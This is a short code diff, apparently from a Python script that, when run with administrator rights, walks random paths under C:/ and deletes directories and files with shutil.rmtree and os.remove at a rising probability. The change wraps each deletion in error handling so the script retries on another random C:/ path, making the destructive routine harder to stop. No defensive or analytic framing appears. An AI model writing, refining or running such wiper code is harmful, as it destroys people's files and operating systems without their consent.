@@ -30,13 +30,21 @@ if is_admin():
                     
                     rdprcnt = random.random()
                     if rdprcnt < pctodel: 
-                        shutil.rmtree(path.replace("\\", "/"))
+                        try: shutil.rmtree(path.replace("\\", "/"))
+                        except:
+                            pctodel = 0
+                            path = random.choice(glob.glob("C:/*"))
+                            continue
                         break
                     
                     pctodel += 0.1
                     
                 else:
-                    os.remove(path.replace("\\", "/"))
+                    try: os.remove(path.replace("\\", "/"))
+                    except:
+                        pctodel = 0
+                        path = random.choice(glob.glob("C:/*"))
+                        continue
                     break         
 
 
